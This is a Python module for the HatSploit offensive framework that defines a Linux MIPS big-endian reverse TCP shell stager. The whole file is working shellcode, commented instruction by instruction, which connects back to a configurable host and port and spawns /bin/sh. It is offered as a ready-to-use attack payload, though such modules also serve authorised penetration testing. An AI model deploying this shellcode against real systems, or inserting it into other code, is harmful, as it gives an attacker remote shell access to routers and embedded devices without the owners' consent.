#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

import socket

from hatsploit.lib.payload import Payload
from hatsploit.utils.tcp import TCPClient


class HatSploitPayload(Payload):
    details = {
        'Category': "stager",
        'Name': "Linux mipsbe Shell Reverse TCP",
        'Payload': "linux/mipsbe/shell_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Shell reverse TCP payload for Linux mipsbe.",
        'Comments': [
            ''
        ],
        'Architecture': "mipsbe",
        'Platform': "linux",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'CBHOST': {
            'Description': "Connect-back host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'CBPORT': {
            'Description': "Connect-back port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)

        return (
            b"\x28\x04\xff\xff"  # slti     a0,zero,-1
            b"\x24\x02\x0f\xa6"  # li       v0,4006
            b"\x01\x09\x09\x0c"  # syscall  0x42424
            b"\x28\x04\x11\x11"  # slti     a0,zero,4369
            b"\x24\x02\x0f\xa6"  # li       v0,4006
            b"\x01\x09\x09\x0c"  # syscall  0x42424
            b"\x24\x0c\xff\xfd"  # li       t4,-3
            b"\x01\x80\x20\x27"  # nor      a0,t4,zero
            b"\x24\x02\x0f\xa6"  # li       v0,4006
            b"\x01\x09\x09\x0c"  # syscall  0x42424
            b"\x24\x0c\xff\xfd"  # li       t4,-3
            b"\x01\x80\x20\x27"  # nor      a0,t4,zero
            b"\x01\x80\x28\x27"  # nor      a1,t4,zero
            b"\x28\x06\xff\xff"  # slti     a2,zero,-1
            b"\x24\x02\x10\x57"  # li       v0,4183
            b"\x01\x09\x09\x0c"  # syscall  0x42424
            b"\x30\x44\xff\xff"  # andi     a0,v0,0xffff
            b"\x24\x02\x0f\xc9"  # li       v0,4041
            b"\x01\x09\x09\x0c"  # syscall  0x42424
            b"\x24\x02\x0f\xc9"  # li       v0,4041
            b"\x01\x09\x09\x0c"  # syscall  0x42424
            b"\x3c\x05\x00\x02"  # lui      a1,0x2
            b"\x34\xa5:cbport:port:"  # "\x7a\x69"  # ori   a1,a1,0x7a69
            b"\xaf\xa5\xff\xf8"  # sw       a1,-8(sp)
            b"\x3c\x05:cbhost1:"  # "\xc0\xa8"  # lui   a1,0xc0a8
            b"\x34\xa5:cbhost2:"  # "\x01\x37"  # ori   a1,a1,0x137
            b"\xaf\xa5\xff\xfc"  # sw       a1,-4(sp)
            b"\x23\xa5\xff\xf8"  # addi     a1,sp,-8
            b"\x24\x0c\xff\xef"  # li       t4,-17
            b"\x01\x80\x30\x27"  # nor      a2,t4,zero
            b"\x24\x02\x10\x4a"  # li       v0,4170
            b"\x01\x09\x09\x0c"  # syscall  0x42424
            b"\x3c\x08\x2f\x2f"  # lui      t0,0x2f2f
            b"\x35\x08\x62\x69"  # ori      t0,t0,0x6269
            b"\xaf\xa8\xff\xec"  # sw       t0,-20(sp)
            b"\x3c\x08\x6e\x2f"  # lui      t0,0x6e2f
            b"\x35\x08\x73\x68"  # ori      t0,t0,0x7368
            b"\xaf\xa8\xff\xf0"  # sw       t0,-16(sp)
            b"\x28\x07\xff\xff"  # slti     a3,zero,-1
            b"\xaf\xa7\xff\xf4"  # sw       a3,-12(sp)
            b"\xaf\xa7\xff\xfc"  # sw       a3,-4(sp)
            b"\x23\xa4\xff\xec"  # addi     a0,sp,-20
            b"\x23\xa8\xff\xec"  # addi     t0,sp,-20
            b"\xaf\xa8\xff\xf8"  # sw       t0,-8(sp)
            b"\x23\xa5\xff\xf8"  # addi     a1,sp,-8
            b"\x27\xbd\xff\xec"  # addiu    sp,sp,-20
            b"\x28\x06\xff\xff"  # slti     a2,zero,-1
            b"\x24\x02\x0f\xab"  # li       v0,4011
            b"\x00\x90\x93\x4c"  # syscall  0x2424d
        ), {
            'cbport': connback_port,
            'cbhost1': socket.inet_aton(connback_host)[:2],
            'cbhost2': socket.inet_aton(connback_host)[2:]
        }
